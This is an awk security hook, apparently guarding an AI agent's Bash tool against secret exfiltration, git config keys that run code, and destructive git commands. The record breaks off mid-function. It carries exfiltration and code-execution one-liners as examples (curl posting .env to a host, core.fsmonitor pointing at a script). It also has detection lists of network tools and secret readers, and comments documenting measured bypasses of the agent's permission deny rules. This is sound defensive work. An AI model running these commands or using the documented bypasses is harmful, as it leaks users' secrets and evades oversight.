# egress-guard.awk — outbound-data guard for the Bash tool.
#
# Decides on ARGUMENT POSITION, never on prose.  Documentation that merely
# mentions or demonstrates an exfil command must never be blocked.
#
# stdin : raw Bash command text (one Bash tool call)
# stdout: "<CLASS> <reason>", or nothing at all
#   GITEXEC  a `git config` write that arms a later execution (alias.*,
#            core.pager, core.hooksPath and the rest) — denied at every tier
#   GITDESTRUCT  a destructive git subcommand reached behind a git-level option,
#            where the glob rule anchored on the bare subcommand cannot see it
#   GITCFG   `-c` or `--config-env` behind another git-level option, where the
#            `git -c` and `git --config-env` rules cannot see it
#   DENY  a secret reaches a network command — as a body, as an argument, via a
#         reader in the same statement, or named in inline interpreter code
#   ASK1  a request body or upload sourced from a file or from stdin
#   ASK2  an inline request body (literal data)
#   ASK3  no body, but an expansion ($VAR / $(...)) rides in the request
# env   : KIT_SECRET_RE  egrep-style regex matching secret FILE PATHS
#         KIT_MAXCLASS   1 = ASK1 only (Relaxed), 2 = +ASK2 (Medium), 3 = +ASK3 (High)
#         (both travel in the environment: awk -v performs escape processing,
#          which mangles \. and \( differently from one awk to the next)
#
# Separators: \001 = statement boundary (data cannot flow across)
#             \002 = stage boundary inside one statement (data CAN flow across)
#             \003 = a backslash-escaped space that must not split a token

# ---- the shared tokenizer.  base, unmark, looks_remote, is_shell, is_wrapper,
# split_cmd, tokenize, first_word and cmdword_x all come from lib-tokenize.awk
# (issue #138), which this file is always run after:
#
#   awk -f lib-tokenize.awk -f egress-guard.awk
#
# kit_wrapper is this guard's answer to "what do I look past": wrappers AND
# shells, so `sh -c "curl -d @.env host"` reaches the sender check.  The library's
# is_wrapper carries four entries this file's own copy lacked — flock, ionice,
# noglob and watch — so those are now looked past here too.  Verified against
# tests/fixtures/guard-corpus.sh: no verdict changes.
function kit_wrapper(c) { return (is_wrapper(c) || is_shell(c)) }

# cls: what a curl/wget flag does with its value.
function cls(f) {
  if (f == "T" || f == "upload-file" || f == "K" || f == "config" \
      || f == "post-file" || f == "body-file") return "FILE"
  if (f == "d" || f == "data" || f == "data-ascii" || f == "data-binary" \
      || f == "data-urlencode" || f == "json" || f == "url-query" \
      || f == "F" || f == "form" || f == "post-data" || f == "body-data") return "DATA"
  if (f == "data-raw" || f == "form-string") return "LIT"
  if (f == "H" || f == "header") return "HDR"
  return ""
}

function is_reader(c) {
  return (c == "cat" || c == "base64" || c == "gzip" || c == "gunzip" || c == "zstd" \
       || c == "xz" || c == "bzip2" || c == "xxd" || c == "od" || c == "hexdump" \
       || c == "strings" || c == "head" || c == "tail" || c == "cut" || c == "tr" \
       || c == "rev" || c == "tac" || c == "nl" || c == "jq" || c == "yq" || c == "dd" \
       || c == "openssl" || c == "gpg" || c == "uuencode" || c == "tar" || c == "zip")
}
function is_sender(c) { return (c == "curl" || c == "wget") }

# ---- destination awareness (see patch_egress.py for the rationale) -------------
function safe_host(h) {
  if (h == "") return 0
  return (h ~ /(^|\.)solana\.com$/ \
       || h ~ /(^|\.)helius-rpc\.com$/ || h == "api.helius.xyz" \
       || h ~ /(^|\.)quiknode\.pro$/   || h ~ /(^|\.)jup\.ag$/ \
       || h == "hermes.pyth.network"   || h == "release.solana.com" \
       || h == "localhost" || h ~ /^127\./ || h == "0.0.0.0" \
       || h == "github.com" || h == "api.github.com" || h == "codeload.github.com" \
       || h ~ /(^|\.)githubusercontent\.com$/ \
       || h ~ /(^|\.)npmjs\.org$/ || h ~ /(^|\.)crates\.io$/ \
       || h == "sh.rustup.rs" || h ~ /(^|\.)rust-lang\.org$/ \
       || h == "pypi.org" || h == "files.pythonhosted.org")
}

# Pull the host out of a token that looks like a URL or a bare host[:port].
function url_host(tok,   h) {
  h = tok
  if (h ~ /^[A-Za-z][A-Za-z0-9+.-]*:\/\//) sub(/^[A-Za-z][A-Za-z0-9+.-]*:\/\//, "", h)
  else if (h !~ /\./ && h !~ /^localhost/) return ""
  sub(/[\/?#].*$/, "", h)
  sub(/^[^@]*@/, "", h)
  sub(/:[0-9]+$/, "", h)
  if (h ~ /[^A-Za-z0-9.:_-]/) return ""
  return tolower(h)
}
function is_interp(c) {
  return (c == "python" || c == "python2" || c == "python3" || c == "node" || c == "deno" \
       || c == "bun" || c == "perl" || c == "ruby" || c == "php" || c == "osascript")
}
function is_netcmd(c) {
  return (is_sender(c) || is_interp(c) || c == "nc" || c == "ncat" || c == "netcat" \
       || c == "socat" || c == "telnet" || c == "ssh" || c == "scp" || c == "sftp" \
       || c == "rsync" || c == "dig" || c == "nslookup" || c == "host" \
       || c == "gh" || c == "glab" || c == "aws" || c == "gsutil" || c == "az" \
       || c == "http" || c == "xh" || c == "ftp" || c == "lftp")
}
function is_netsink(c) { return (is_netcmd(c) && !is_interp(c)) }

# An interpreter is only a network sink when its inline code actually names a
# network API.  `cat .env | python3 -c "print(sys.stdin.read())"` is local work.
function code_has_net(a) {
  return (a ~ /urlopen|urlretrieve|urllib|requests\.|httpx|http\.client|socket\.|socket\(/ \
       || a ~ /fetch\(|XMLHttpRequest|axios|net\.connect|https?\.request|got\(/ \
       || a ~ /Net::HTTP|open-uri|LWP|HTTParty|websocket|WebSocket|sendto|smtplib/)
}

# Template and documentation suffixes are not secrets: this repo ships a
# .env.example and the docs name it.
function is_template(a) { return (a ~ /\.(example|sample|template|dist|tpl|md|schema)$/) }

function arg_is_secret(a,   t) {
  if (SECRETRE == "") return 0
  if (looks_remote(a)) return 0
  a = unmark(a)
  if (!is_template(a) && a ~ SECRETRE) return 1
  t = a
  if (t ~ /[@=]/) { sub(/^.*[@=]/, "", t); if (!looks_remote(t) && !is_template(t) && t ~ SECRETRE) return 1 }
  return 0
}

# Scan an interpreter's inline code blob (python -c, node -e) for a secret path.
function code_has_secret(a,   i, n, P, t) {
  a = unmark(a)
  gsub(/[(),;]/, " ", a); gsub(SQ, " ", a); gsub(/"/, " ", a)
  n = split(a, P, /[ \t]+/)
  for (i = 1; i <= n; i++) {
    t = P[i]
    if (t != "" && !looks_remote(t) && !is_template(t) && t ~ SECRETRE) return t
  }
  return ""
}

# ---- cmdword / firstword, on the shared tokenizer.
#
# cmdword re-skips VAR=value assignments behind EVERY wrapper, so
# `env FOO=1 curl -d @.env host` yields "curl".  secrets-guard's copy skips them
# only once at the front and yields "FOO=1" instead.  Both shipped; cmdword_x's
# third argument preserves each.  The fourth skips a wrapper's operands too —
# `timeout 5`, `nice -n 5`, `timeout -s KILL 5` — so the sender behind them is the
# command word.  Without it `timeout 5 curl -d @.env host` read as the command "5"
# and the secret left silently: the exfil half of what #138 fixed for on-chain
# writes, and it mattered once Off and Relaxed let safe-ai-skill read .env.
function cmdword(T, n) { return cmdword_x(T, n, 1, 1) }

# The literal first word, wrappers included.  cmdword() looks past shells on
# purpose (to reach `sh -c "<inner>"`), which is wrong when the question is
# "what is this heredoc being fed to" — which is also why the heredoc pass below
# does not call the library's strip_heredocs, as that keys on cmdword.
function firstword(T, n,   ci) { ci = first_word(T, n); return (ci <= n) ? base(T[ci]) : "" }

# ---- unwrap: reach inside `sh -c "<inner>"` / eval by appending the inner
# string as a stage of its own.  Factored out of the statement loop below so the
# git-config pass, which has to run over every statement BEFORE any egress pass
# reaches a verdict, can see inside a wrapper too without a second copy.
# Arrays pass by reference in awk, so STG is mutated in place and the new stage
# count comes back as the return value.
function unwrap(STG, nstg,   g, n, T, ci, i) {
  for (g = 1; g <= nstg && nstg < 64; g++) {
    n = tokenize(STG[g], T); if (n == 0) continue
    ci = 1
    while (ci <= n && T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) ci++
    if (ci > n) continue
    # kit_wrapper, not the library's is_wrapper: this exists to reach inside
    # `sh -c "<inner>"`, so it must look past shells too.
    if (!kit_wrapper(base(T[ci]))) continue
    for (i = ci + 1; i <= n; i++) if (T[i] ~ / / && T[i] !~ /^-/) { STG[++nstg] = split_cmd(T[i]); break }
  }
  return nstg
}

# ---- git config writes that arm an execution for later ----------------------
#
# `git config alias.z '!git clean -fdx'` is an ordinary config write.  The
# destruction happens afterwards, in `git z`, where the dangerous verb never
# appears on the command line any rule gets to read.  Two glob denies cover the
# common spelling at the permission layer, before this hook runs
# (`Bash(git config *alias.*)` and its zero-gap twin `Bash(git config alias.*)`),
# and they stay: this pass is the second layer, not a replacement.
#
# What only a hook can do, which is why the rest of the hole is closed here:
#
#   * CASE.  Git's section and variable names are case-insensitive and a
#     permission glob is not, so `git config Alias.z '!git clean -fdx'` walks
#     straight past both globs — confirmed upstream by writing `Alias.Y` and
#     reading it back with `--get alias.y`.  No glob can fix it: `alias` alone
#     has 32 case spellings, and that is one key of seven.
#   * THE OTHER CODE-EXECUTING KEYS.  core.pager, core.editor, core.hooksPath,
#     sequence.editor, credential.helper and diff.external each name a program
#     git runs later.  Before this pass they were covered only in the one-shot
#     `git -c key=value` form, by the blanket `Bash(git -c *)` deny.
#   * READS vs WRITES.  The globs gate `git config --get alias.z` as well,
#     as collateral nobody minded.  A hook can tell the two apart, so this one
#     does: --get, --get-all, --get-regexp, --list and -l stay silent, which
#     narrows the shipped behaviour on purpose.
#   * `git config --edit`, which opens an editor on the config and names no key.
#
# Ordinary keys are untouched — user.email, user.name, core.autocrlf,
# remote.origin.url, push.default, init.defaultBranch — which is the whole
# reason `git config` is not denied as a whole command.  A false positive here
# breaks /quick-commit and every normal setup step.
#
# Not covered here, stated rather than papered over:
#   * a shell redirect into .git/config, which is not a `git config` command at
#     all, so no amount of subcommand parsing reaches it.  The layer below does:
#     Claude Code's sandbox refuses shell writes to the project's .git/config and
#     .git/hooks/ wherever it is on, and High denies the file tools the same paths
#     (DENY_GIT_CONFIG_AND_HOOKS in firewall.sh).  Off, and a command line led by
#     an excludedCommands entry, are left with neither;
#   * GIT_CONFIG_COUNT / GIT_CONFIG_KEY_0 / GIT_CONFIG_VALUE_0, GIT_CONFIG_PARAMETERS
#     and GIT_CONFIG_GLOBAL in the environment, which are `git -c` by another name.

# gc_silent_opt — the `git config` forms this pass does not gate: the readers,
# which are ordinary work, and the removers, which can only take a key away.
function gc_silent_opt(o) {
  return (o == "--get" || o == "--get-all" || o == "--get-regexp" \
       || o == "--get-urlmatch" || o == "--get-color" || o == "--get-colorbool" \
       || o == "--list" || o == "-l" \
       || o == "--unset" || o == "--unset-all" || o == "--remove-section")
}

# gc_opt_operand — a `git config` option that eats the NEXT token.  Missing one
# is the bug that bites: `git config --file f core.pager x` puts `f` in key
# position and the real key in value position, where nothing would look at it.
function gc_opt_operand(o) {
  return (o == "-f" || o == "--file" || o == "--blob" || o == "--type" \
       || o == "--default" || o == "--value" || o == "--comment")
}

# git_global_operand — a git-LEVEL option, ahead of the subcommand, that eats the
# next token.  Verified by hand against the installed git: `--git-dir .git`,
# `--namespace ns` and `--attr-source HEAD` all leave the subcommand running, so
# they do consume one, and so does the undocumented `--shallow-file`
# (`git --shallow-file x status --short` runs status), which this list lacked
# until a review found `git --shallow-file x clean -fdx` silent.  `--exec-path`
# does NOT: `git --exec-path /tmp rev-parse` printed the exec path and ignored
# the rest — git_walk stops there.  Getting one wrong costs a MISS, never a false
# positive: the walk lands on the wrong token, finds no subcommand it knows, and
# stays silent.
function git_global_operand(o) {
  return (o == "-C" || o == "-c" || o == "--git-dir" || o == "--work-tree" \
       || o == "--namespace" || o == "--attr-source" || o == "--super-prefix" \
       || o == "--config-env" || o == "--shallow-file")
}

# git_walk — the shared option walker.  Returns 1 on a real git invocation and
# fills four globals: GW_SUB (the subcommand), GW_I (the index of the first
# token after it), GW_PREFIXED (1 when at least one git-level option came
# first) and GW_CFG (`-c` or `--config-env` when one of them came after another
# git-level option, else "").  GW_CFG is set even when no subcommand follows.
# All three git passes below run off this one walk.
function git_walk(T, n,   i, o, k) {
  GW_SUB = ""; GW_I = 0; GW_PREFIXED = 0; GW_CFG = ""
  # cmdword_x's fourth argument skips a wrapper's positional operand, as cmdword
  # does for the egress passes: `timeout 5 git config alias.z '!x'` would leave
  # "5" in command position otherwise.
  if (cmdword_x(T, n, 1, 1) != "git") return 0
  i = CWI + 1; k = 0
  while (i <= n && substr(T[i], 1, 1) == "-" && T[i] != "-" && T[i] != "--") {
    o = T[i]; sub(/=.*$/, "", o)
    # git prints and exits on these — help, the version, a path or command-list
    # query — so no subcommand runs.  `git --help clean` is `git help clean`, which
    # no rule denies, and deciding it here was a false positive.  A -c or
    # --config-env already walked past stays in GW_CFG: `git help` reads config
    # (man.<tool>.cmd, web.browser), so that half still matters.
    if (o == "-h" || o == "--help" || o == "-v" || o == "--version" || o == "--html-path" \
        || o == "--man-path" || o == "--info-path" || o == "--list-cmds" \
        || T[i] == "--exec-path") return 0
    # k counts the options before this one: the first option is what the
    # `git -c *` and `git --config-env*` rules are anchored on, so only a later
    # one is a spelling they cannot see.
    if (k > 0 && GW_CFG == "" && (o == "-c" || o == "--config-env")) GW_CFG = o
    if (git_global_operand(o) && T[i] !~ /=/) i++
    i++; k++
    GW_PREFIXED = 1
  }
  if (i > n) return 0
  GW_SUB = T[i]
  GW_I = i + 1
  return 1
}

# gc_exec_key — does this key name a program git will run later?  Compared
# lowercased, which is the entire point of the pass: git treats the section and
# variable names as case-insensitive and only the middle subsection as
# case-sensitive, so only the two ends are compared and
# `credential.https://GitHub.com.HELPER` resolves like credential.helper.
function gc_exec_key(key,   k, n, P) {
  k = tolower(unmark(key))
  n = split(k, P, /\./)
  if (n < 2) return 0
  if ((P[1] ".*") in GC_KEY) return 1          # alias.* — every variable runs
  return ((P[1] "." P[n]) in GC_KEY)
}

# gc_exec_section — the section half alone, for --rename-section's destination.
# `git config --rename-section foo core` turns an ungated `foo.pager` write into
# core.pager, which is the same hole reached in two steps.
function gc_exec_section(s,   P) {
  split(tolower(unmark(s)), P, /\./)
  return (P[1] in GC_SECTION)
}

# gc_scan — one pipeline stage.  Returns the reason to deny, or "".
function gc_scan(stage,   n, T, i, j, tok, o, mode, nop, OP, key) {
  n = tokenize(stage, T); if (n == 0) return ""
  if (!git_walk(T, n)) return ""
  # Subcommand position, and nothing else.  `git commit -m "git config alias.z"`
  # stops here: GW_SUB is "commit", so the message is data and never a command.
  if (GW_SUB != "config") return ""
  i = GW_I

  mode = ""; nop = 0
  for (; i <= n; i++) {
    tok = T[i]
    if (substr(tok, 1, 1) == "-" && tok != "-") {
      o = tok; sub(/=.*$/, "", o)
      if (gc_silent_opt(o)) return ""
      else if (o == "--edit" || o == "-e") mode = "edit"
      else if (o == "--add" || o == "--replace-all") { if (mode == "") mode = "write" }
      else if (o == "--rename-section") { if (mode == "") mode = "rename" }
      else if (gc_opt_operand(o) && tok !~ /=/) i++
      # Every other flag is a file selector or a modifier — --global, --local,
      # --system, --worktree, --fixed-value, --show-origin, -z — and changes
      # nothing about which key is being written.
      continue
    }
    OP[++nop] = tok
  }

  j = 1
  if (mode == "" && nop >= 1) {
    # The subcommand form (git 2.46+): git config set|get|list|edit|unset|…
    if (OP[1] == "set") { mode = "write"; j = 2 }
    else if (OP[1] == "edit") { mode = "edit"; j = 2 }
    else if (OP[1] == "rename-section") { mode = "rename"; j = 2 }
    else if (OP[1] == "get" || OP[1] == "list" || OP[1] == "unset" \
          || OP[1] == "unset-all" || OP[1] == "remove-section") return ""
  }

  if (mode == "edit") return "runs git config --edit, which opens an editor on the git config file"
  if (mode == "rename") {
    if (nop >= j + 1 && gc_exec_section(OP[j + 1]))
      return "renames a git config section onto \"" unmark(OP[j + 1]) "\", where its existing variables would become keys git executes"
    return ""
  }
  if (nop < j) return ""
  key = OP[j]
  # The bare form with no value is a READ: `git config core.pager` prints it.
  if (mode == "" && nop < j + 1) return ""
  if (!gc_exec_key(key)) return ""
  return "writes git config " unmark(key) ", a key that names a command git runs later"
}

# ---- destructive git subcommands behind a git-level option -------------------
#
# Every destructive-git deny is a glob anchored on the literal subcommand, so a
# git-level option in front of it sits where the glob expects `git`, and none of
# them match.  `Bash(git -C *)` is the only one of those doors shut for that
# reason; `-c` and `--config-env` are denied as config setters, which shuts them
# too, but only in first position (GITCFG below is the rest of that).
# Measured against the live `Bash(git clean *)`:
#
#   git --no-pager clean --dry-run           ran
#   git --git-dir=.git clean --dry-run       ran
#   git -P clean --dry-run                   ran
#   git --literal-pathspecs clean --dry-run  ran   (not even in git's synopsis)
#   git -C . clean --dry-run                 DENIED
#
# `git --help` lists the whole set before <command> (the count varies by git
# version, so read it there rather than trusting a number), and only `-C`, `-c`
# and `--config-env` are denied.  Some of them print and stop rather than
# reaching a subcommand — `-h`/`--help`, `-v`/`--version`, the three
# path-printing ones, `--list-cmds=` and a bare `--exec-path` — and git_walk
# stops on each, since `git --help clean` runs `git help clean` and nothing else.
# The ones that do pass through — `--no-pager`, `-p`, `-P`, `--bare`,
# `--git-dir`, `--work-tree`, `--namespace`, `--shallow-file`, `--config-env`,
# the `--no-*` switches and the undocumented `--literal-pathspecs` family — repeat
# and combine freely, and the ones taking a value take it as `--opt=v` or
# `--opt v`, so there is no glob set to enumerate.  There is one option walk, and
# git_walk above already had to do it to find `config`.
#
# THE DESIGN RULE, and the reason this pass is this narrow: it MIRRORS the glob
# rules and changes no tier's policy.  It fires only when GW_PREFIXED is set —
# the unprefixed spelling is already decided at the permission layer, by a rule
# that applies at every tier, and re-deciding it here would put a hook's
# predicate in front of commands a glob is handling correctly today.  The hook
# closes a bypass; it does not set policy.  Each predicate below is the glob it
# mirrors, never wider: `--ha` and `--mirror` are matched as a token PREFIX where
# the glob matches the substring anywhere, so a pathspec containing `--ha` fires
# the rule but not the hook.  Narrower is allowed here; stricter is not.
#
# Mirroring a glob includes its bare form.  In Claude Code's matcher a trailing
# ` *` that is a rule's ONLY wildcard is optional, so `Bash(git clean *)` denies
# `git clean` with nothing after it (documented, and verified live: bare `chown`
# is refused by `Bash(chown *)` with no twin beside it).  The first version of
# this pass required an argument after clean, restore, `checkout --` and
# `reflog expire`, on the belief that the glob did too, and that left the
# prefixed bare form covered by neither layer.  It matters for clean: with
# `clean.requireForce` false, a bare `git clean` deletes untracked files, and
# `git -P --config-env=clean.requireForce=V clean` sets that inside the same
# command line, behind an option no glob sees past.
#
# WHAT IS IN, and why each earns the parsing surface:
#   reflog expire / delete / drop
#                   FIREWALL-SPEC.md section 3.4 singles out expire as the command
#                   that makes history unrecoverable, and delete (chosen entries)
#                   and drop (whole reflogs) remove the same record by other
#                   means.  Strongest case in the set.  The word right after
#                   `reflog` only, as the globs anchor it: show, list, exists and
#                   a bare `git reflog` are reads and stay silent.
#   gc --prune      deletes the unreachable objects prune does, so prune's case
#                   below is its case too.  A token beginning `--prune` after the
#                   `gc` subcommand, which is narrower than `Bash(git gc
#                   *--prune*)`: `--no-prune` begins otherwise, and `fetch
#                   --prune`, `remote prune`, `worktree prune` and `prune-packed`
#                   never put "gc" in GW_SUB, so the substring hazard prune-packed
#                   once posed does not reach this test.
#   prune           with no --expire it deletes every unreachable loose object,
#                   whatever its age.  Those are what `git fsck` recovers a
#                   dropped stash from, or a deleted branch no reflog still
#                   reaches, so prune is the step that makes that loss final.
#                   `Bash(git prune *)` denies it at every tier, and an open
#                   prefixed spelling made that rule decorative.  The subcommand
#                   only: `worktree prune`, `remote prune`, `prune-packed` and
#                   `fetch --prune` are other commands, and GW_SUB never equals
#                   "prune" for any of them.
#   clean, restore, checkout -- <path>, reset --hard
#                   these destroy UNCOMMITTED work, which is in no reflog.
#   push --mirror   overwrites every ref on the remote, for everyone, and is not
#                   recoverable from anything local.
#   --upload-pack / --receive-pack / --exec
#                   these name a PROGRAM for git to run.  `git push/pull/fetch`
#                   are three of the eight sandbox excludedCommands, so that
#                   program runs with the OS sandbox lifted — arbitrary code
#                   execution, which outranks everything else here.
#
# WHAT IS OUT, deliberately:
#   branch -D / --delete / -f   reflog-recoverable, and the worst parsing surface
#                   in the set: -D against a safe -d, -f clustered inside -Df,
#                   and `--sort=-date` already tripped a `-d` matcher in this
#                   same guard once.  Friction without safety.
#
# KNOWN MISSES, stated rather than papered over: a variable-indirected command
# (`G=git; $G clean -fd`) is invisible to this walk, and so is a subcommand the
# shell builds after the hook has read the words — `$'clean'`, `{clean,}`,
# `${X:-clean}` — and git inside a script the agent wrote.  For all of those the
# OS sandbox is the only layer left, and `.git` is in its allowWrite.  `git checkout <tree-ish> -- <path>`
# and `git checkout --force -- .` are open in BOTH layers, because the glob is
# `git checkout -- *` and this pass mirrors it rather than widening it.  So are
# git named by path (`/usr/bin/git clean -fd`) and a quoted subcommand
# (`git 'clean' -fd`) with no option in front: Claude Code documents that a
# deny rule matches neither, and with nothing prefixed this pass stays silent.
# And a long option abbreviated past its glob — `git gc --p=now`, which git's
# parser accepts if `--p` is unique among gc's options — is missed here exactly
# as the glob misses it.

function gd_scan(stage,   n, T, i) {
  n = tokenize(stage, T); if (n == 0) return ""
  if (!git_walk(T, n)) return ""
  if (!GW_PREFIXED) return ""          # the glob rules own the unprefixed form
  i = GW_I

  # No argument count on any of these: each glob's trailing ` *` matches the
  # bare subcommand too, so the bare prefixed form is denied to match.
  if (GW_SUB == "clean")
    return "runs git clean behind a git-level option, deleting untracked files"
  if (GW_SUB == "restore")
    return "runs git restore behind a git-level option, overwriting the working tree"
  if (GW_SUB == "checkout" && i <= n && T[i] == "--")
    return "runs git checkout -- <path> behind a git-level option, discarding uncommitted changes"
  if (GW_SUB == "prune")
    return "runs git prune behind a git-level option, deleting the unreachable objects a dropped stash or a deleted branch could still be recovered from"
  if (GW_SUB == "gc") {
    for (; i <= n; i++)
      if (T[i] ~ /^--prune/)          # --prune and --prune=<date>; never --no-prune
        return "runs git gc --prune behind a git-level option, deleting the unreachable objects a dropped stash or a deleted branch could still be recovered from"
    return ""
  }
  if (GW_SUB == "reset") {
    for (; i <= n; i++)
      if (T[i] ~ /^--ha/)             # --hard, and the --ha abbreviation git accepts
        return "runs git reset --hard behind a git-level option, discarding uncommitted changes"
    return ""
  }
  if (GW_SUB == "reflog" && i <= n) {
    if (T[i] == "expire")
      return "runs git reflog expire behind a git-level option, which is what makes history unrecoverable"
    if (T[i] == "delete" || T[i] == "drop")
      return "runs git reflog " T[i] " behind a git-level option, removing the reflog entries a dropped commit is recovered from"
    return ""
  }
  if (GW_SUB == "push") {
    for (; i <= n; i++) {
      if (T[i] ~ /^--mirror/)
        return "runs git push --mirror behind a git-level option, overwriting every ref on the remote"
      if (T[i] ~ /^--receive-pack/ || T[i] ~ /^--exec/)
        return "names a program for git to run as the far end of a push, behind a git-level option"
    }
    return ""
  }
  if (GW_SUB == "pull" || GW_SUB == "fetch" || GW_SUB == "clone" || GW_SUB == "ls-remote") {
    for (; i <= n; i++)
      if (T[i] ~ /^--upload-pack/)
        return "names a program for git to run as the far end of a " GW_SUB ", behind a git-level option"
    return ""
  }
  return ""
}

# ---- -c and --config-env behind another git-level option -------------------
#
# `git -c core.fsmonitor=/tmp/x.sh status` is arbitrary code execution, and
# `X=/tmp/x.sh git --config-env=core.fsmonitor=X status` is the same thing with
# the value read from $X.  `Bash(git -c *)` and `Bash(git --config-env*)` deny
# both at every tier, anchored on the first token after `git` — so another
# git-level option in front (`git --no-pager -c …`, `git -P --config-env …`)
# walks past them exactly as it walks past the subcommand globs above.  Measured
# before this pass existed: `git --no-pager -c core.fsmonitor=/tmp/x.sh status`
# reached neither a rule nor this hook.
#
# The GITDESTRUCT design, applied to two options instead of a subcommand: it
# mirrors the rules, fires only when the option comes after another one
# (git_walk's GW_CFG), and leaves the first-position spelling to the rules —
# which already match it behind a VAR=value, since a deny rule matches past any
# leading assignment.  Every key, because the rules deny every key: which keys
# execute is GITEXEC's list, and a shorter one here would only reopen what the
# rule closes.  The walk stops at the subcommand, so a commit message or a
# --grep pattern that names either option is data and never reaches this test.
function gcfg_scan(stage,   n, T) {
  n = tokenize(stage, T); if (n == 0) return ""
  git_walk(T, n)
  if (GW_CFG == "") return ""
  return "sets git config for this one command with " GW_CFG " behind another git-level option, where a key such as core.fsmonitor, core.pager or alias.* names a program git runs"
}

BEGIN {
  SQ = sprintf("%c", 39)
  SECRETRE = ENVIRON["KIT_SECRET_RE"]
  MAXCLASS = ENVIRON["KIT_MAXCLASS"] + 0
  if (MAXCLASS < 1) MAXCLASS = 1
  HD_DQ = "<<-?[ \t]*\"[A-Za-z_][A-Za-z0-9_]*\""
  HD_SQ = "<<-?[ \t]*" SQ "[A-Za-z_][A-Za-z0-9_]*" SQ
  HD_BARE = "<<-?[ \t]*[A-Za-z_][A-Za-z0-9_]*"
  # The code-executing config keys, in their canonical spellings so the set a
  # reader checks against the docs is the set the code compares.  Matched
  # lowercased; `alias.*` means every variable in the section.
  GC_EXEC = "alias.* core.pager core.editor core.hooksPath sequence.editor credential.helper diff.external"
  gcn = split(GC_EXEC, GCK, " ")
  for (gci = 1; gci <= gcn; gci++) {
    GC_KEY[tolower(GCK[gci])] = 1
    gcs = tolower(GCK[gci]); sub(/\..*$/, "", gcs)
    GC_SECTION[gcs] = 1
  }
}
{ raw = raw $0 "\n" }
END {
  # ---- strip heredoc BODIES: a doc that merely SHOWS a curl must never fire.
  # Exception: an UNQUOTED delimiter feeding a shell or interpreter is code.
  text = ""; delim = ""
  nl = split(raw, L, "\n")
  for (k = 1; k <= nl; k++) {
    l = L[k]
    if (delim != "") {
      t = l; gsub(/^[ \t]+|[ \t]+$/, "", t)
      if (t == delim) delim = ""
      continue
    }
    quoted = 0
    if (match(l, HD_DQ) || match(l, HD_SQ)) quoted = 1
    else if (!match(l, HD_BARE)) RSTART = 0
    if (RSTART > 0) {
      d = substr(l, RSTART, RLENGTH)
      sub(/^<<-?[ \t]*/, "", d); gsub(/"/, "", d); gsub(SQ, "", d)
      hn = tokenize(split_cmd(substr(l, 1, RSTART - 1)), HT); hw = firstword(HT, hn)
      if (quoted || !(is_shell(hw) || is_interp(hw))) delim = d
    }
    text = text l "\n"
  }

  text = split_cmd(text)
  nst = split(text, ST, "\001")

  # ---- pass 0, over EVERY statement before any other pass reaches a verdict:
  # the three git denies — a config write that arms an execution for later, a
  # config option behind another option, a destructive subcommand behind one.
  # Ahead of the egress passes on purpose — those exit on their first match, so
  # a `curl` in an earlier statement that only ASKs would otherwise shadow a deny
  # here, and an approved prompt runs the whole Bash call, this git call included.
  for (q = 1; q <= nst; q++) {
    stmt = ST[q]
    if (stmt !~ /[^ \t\002]/) continue
    nstg = split(stmt, STG, "\002")
    nstg = unwrap(STG, nstg)
    for (g = 1; g <= nstg; g++) {
      why = gc_scan(STG[g])
      if (why != "") { print "GITEXEC " why; exit }
      why = gcfg_scan(STG[g])
      if (why != "") { print "GITCFG " why; exit }
      why = gd_scan(STG[g])
      if (why != "") { print "GITDESTRUCT " why; exit }
    }
  }

  for (q = 1; q <= nst; q++) {
    stmt = ST[q]
    if (stmt !~ /[^ \t\002]/) continue
    nstg = split(stmt, STG, "\002")

    # unwrap one level of `sh -c "<inner>"` / eval: the inner string is code
    nstg = unwrap(STG, nstg)

    # ---- pass 1: a secret reaching a network command
    leak = ""; sender = 0
    for (g = 1; g <= nstg; g++) {
      n = tokenize(STG[g], T); if (n == 0) continue
      c0 = cmdword(T, n); if (c0 == "") continue
      ci = CWI
      if (is_netsink(c0)) sender = 1

      if (is_reader(c0)) {
        for (i = ci + 1; i <= n; i++) {
          if (T[i] ~ /^-/) continue
          if (arg_is_secret(T[i])) { leak = T[i]; break }
        }
      }
      if (is_netcmd(c0)) {
        for (i = ci + 1; i <= n; i++) {
          a = T[i]
          if (a ~ /^-/ && a !~ /[@=]/) continue
          if (arg_is_secret(a)) { print "DENY secret path \"" unmark(a) "\" is an argument to network command " c0; exit }
          if (is_interp(c0)) {
            if (code_has_net(a)) sender = 1
            if ((t = code_has_secret(a)) != "") { print "DENY inline " c0 " code names a secret path: " t; exit }
          }
        }
      }
      if (match(STG[g], /<[ \t]*[^ \t<][^ \t]*/)) {
        a = substr(STG[g], RSTART, RLENGTH); sub(/^<[ \t]*/, "", a)
        if (arg_is_secret(a)) leak = a
      }
    }
    if (sender && leak != "") { print "DENY a secret file (" unmark(leak) ") is read into a network command in the same statement"; exit }

    # ---- pass 2: curl/wget flag analysis
    for (g = 1; g <= nstg; g++) {
      n = tokenize(STG[g], T); if (n == 0) continue
      if (!is_sender(cmdword(T, n))) continue     # <- prose can never reach here
      ci = CWI

      body = 0; inline = 0; src = ""; secret = ""; expand = 0; dest = ""
      for (i = ci + 1; i <= n; i++) {
        tok = T[i]; name = ""; val = ""; have = 0

        if (tok ~ /^--[A-Za-z]/) {
          name = tok; sub(/^--/, "", name)
          if (name ~ /=/) { val = name; sub(/^[^=]*=/, "", val); sub(/=.*$/, "", name); have = 1 }
          else if (i < n) { val = T[i+1]; have = 1 }
        } else if (tok ~ /^-[A-Za-z]/) {
          rest = tok; sub(/^-/, "", rest); j = 1
          while (j <= length(rest)) {
            ch = substr(rest, j, 1)
            if (cls(ch) != "") { name = ch; val = substr(rest, j + 1); if (val == "" && i < n) val = T[i+1]; have = 1; break }
            if (ch !~ /[A-Za-z]/) break
            j++
          }
        }

        if (have && (c = cls(name)) != "") {
          if (c == "FILE") {
            body = 1; f = val; sub(/^@/, "", f)
            if (f == "-") src = "stdin"
            else { if (src == "") src = f; if (arg_is_secret(f)) secret = f }
          } else if (c == "DATA") {
            body = 1
            if (val ~ /^@/ || val ~ /=@/ || val ~ /=</) {
              f = val; sub(/^.*[@<]/, "", f)
              if (f == "-") src = "stdin"
              else { if (src == "") src = f; if (arg_is_secret(f)) secret = f }
            } else inline = 1
            if (val ~ /\$/) expand = 1
          } else if (c == "LIT") {
            body = 1; inline = 1
            if (val ~ /\$/) expand = 1
          } else if (c == "HDR") {
            if (val ~ /^@/) {
              body = 1; f = val; sub(/^@/, "", f)
              if (f == "-") src = "stdin"
              else { if (src == "") src = f; if (arg_is_secret(f)) secret = f }
